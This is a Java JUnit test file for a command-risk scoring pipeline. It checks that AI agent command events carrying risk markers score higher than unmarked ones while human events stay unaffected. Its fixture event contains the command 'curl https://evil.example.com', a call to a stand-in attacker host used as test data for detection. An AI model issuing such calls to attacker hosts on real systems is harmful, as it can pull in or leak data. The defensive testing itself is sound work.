package com.intentguard.scoring;

import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.jupiter.api.Test;

import com.intentguard.domain.Actor;
import com.intentguard.domain.AgentRiskMarkers;
import com.intentguard.domain.CommandEvent;
import com.intentguard.domain.ComponentId;
import com.intentguard.domain.ComponentResult;
import com.intentguard.domain.InputOrigin;
import com.intentguard.domain.IntentSource;
import com.intentguard.domain.ScoringConfig;
import com.intentguard.domain.ScoringContext;
import com.intentguard.domain.SignalSource;

/**
 * Verifies the agent-risk uplift (Req 13.5) flows through {@link DefaultScoringPipeline}: an
 * {@code AGENT} event carrying a risk marker scores at least as high as the identical event
 * without it, human events are unaffected by markers, the composite stays in [0,1], and scoring
 * is deterministic.
 */
class AgentRiskPipelineTest {

    private static final double EPS = 1e-9;

    private final ScoringConfig config = new ScoringConfig(
            Map.of(
                    ComponentId.SEQUENCE_SURPRISE, 0.25,
                    ComponentId.CONTEXT_MISMATCH, 0.20,
                    ComponentId.BEHAVIORAL_DEVIATION, 0.25,
                    ComponentId.SEMANTIC_INCONSISTENCY, 0.30),
            0.15);

    private final ScoringPipeline pipeline = new DefaultScoringPipeline(
            List.of(
                    fixed(ComponentId.SEQUENCE_SURPRISE, 0.20, 0.25),
                    fixed(ComponentId.CONTEXT_MISMATCH, 0.40, 0.20),
                    fixed(ComponentId.BEHAVIORAL_DEVIATION, 0.30, 0.25),
                    fixed(ComponentId.SEMANTIC_INCONSISTENCY, 0.50, 0.30)),
            new AgentRiskAdjuster());

    @Test
    void agentEventWithAnyMarkerScoresAtLeastAsHighAsWithout() {
        double baseline = pipeline.score(
                agentEvent(AgentRiskMarkers.none()), config).composite();

        AgentRiskMarkers[] combos = {
                new AgentRiskMarkers(true, false, false),
                new AgentRiskMarkers(false, true, false),
                new AgentRiskMarkers(false, false, true),
                new AgentRiskMarkers(true, true, false),
                new AgentRiskMarkers(true, false, true),
                new AgentRiskMarkers(false, true, true),
                new AgentRiskMarkers(true, true, true),
        };
        for (AgentRiskMarkers markers : combos) {
            double withMarker = pipeline.score(agentEvent(markers), config).composite();
            assertThat(withMarker).isGreaterThanOrEqualTo(baseline - EPS);
            assertThat(withMarker).isBetween(0.0, 1.0);
        }
    }

    @Test
    void humanEventIsUnaffectedByMarkers() {
        double withoutMarkers = pipeline.score(
                humanEvent(AgentRiskMarkers.none()), config).composite();
        double withMarkers = pipeline.score(
                humanEvent(new AgentRiskMarkers(true, true, true)), config).composite();
        assertThat(withMarkers).isEqualTo(withoutMarkers);
    }

    @Test
    void pipelineScoreWithMarkersIsDeterministic() {
        CommandEvent agent = agentEvent(new AgentRiskMarkers(true, true, true));
        double a = pipeline.score(agent, config).composite();
        double b = pipeline.score(agent, config).composite();
        double c = pipeline.score(agent, config).composite();
        assertThat(a).isEqualTo(b).isEqualTo(c);
    }

    private static CommandEvent agentEvent(AgentRiskMarkers markers) {
        return event(Actor.agent("svc", "alice"), markers);
    }

    private static CommandEvent humanEvent(AgentRiskMarkers markers) {
        return event(Actor.human("alice"), markers);
    }

    private static CommandEvent event(Actor actor, AgentRiskMarkers markers) {
        return new CommandEvent(
                "evt-1",
                actor,
                null,
                "curl https://evil.example.com",
                "/home/alice/repo",
                "repo",
                Map.of(),
                1_710_000_000_000L,
                InputOrigin.TYPED,
                SignalSource.HOOK,
                IntentSource.NONE,
                markers);
    }

    private static DivergenceComponent fixed(ComponentId id, double score, double weight) {
        return new DivergenceComponent() {
            @Override
            public ComponentId id() {
                return id;
            }

            @Override
            public ComponentResult score(ScoringContext ctx) {
                return ComponentResult.scored(id, score, weight, null);
            }
        };
    }
}
